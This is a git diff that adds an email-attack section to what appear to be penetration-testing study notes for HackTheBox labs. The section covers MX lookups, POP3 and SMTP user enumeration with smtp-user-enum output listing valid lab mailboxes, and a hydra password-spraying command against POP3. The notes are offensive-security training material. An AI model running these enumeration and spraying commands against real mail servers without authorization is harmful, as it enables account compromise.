@@ -1322,5 +1322,120 @@ Once the service is started, a new terminal with the `lewen` user session will
 C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-# DNS
+# EMAIL
+
+## Enumeration
+
+We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.
+
+```bash
+$ host -t MX hackthebox.eu
+
+hackthebox.eu mail is handled by 1 aspmx.l.google.com.
+```
+
+```bash
+$ host -t MX microsoft.com
+
+microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
+```
+
+```bash
+$ dig mx plaintext.do | grep "MX" | grep -v ";"
+
+plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
+plaintext.do.           7076    IN      MX      10 mx.zoho.com.
+plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
+```
+
+```bash
+dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
+```
+
+```bash
+$ host -t A mail1.inlanefreight.htb.
+
+mail1.inlanefreight.htb has address 10.129.14.128
+```
+
+## User Enumeration
+
+```bash
+ telnet 10.10.110.20 110
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
++OK POP3 Server ready
+
+USER julio
+
+-ERR
+
+
+USER john
+
++OK
+```
+
+## smtp-user-enum
+
+```bash
+$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... userlist.txt
+Target count ............. 1
+Username count ........... 78
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Thu Apr 21 06:53:07 2022 #########
+10.129.203.7: jose@inlanefreight.htb exists
+10.129.203.7: pedro@inlanefreight.htb exists
+10.129.203.7: kate@inlanefreight.htb exists
+######## Scan completed at Thu Apr 21 06:53:18 2022 #########
+3 results.
+
+78 queries in 11 seconds (7.1 queries / sec)
+```
+
+```bash
+❯ smtp-user-enum.pl -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12 -m 30
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 30
+Usernames file ........... users.list
+Target count ............. 1
+Username count ........... 79
+Target TCP port .......... 25
+Query timeout ............ 20 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Mon Jan 12 13:49:20 2026 #########
+10.129.203.12: marlin@inlanefreight.htb exists
+######## Scan completed at Mon Jan 12 13:49:25 2026 #########
+1 results.
+```
+
+## Password Attacks
+
+```bash
+$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+```
 
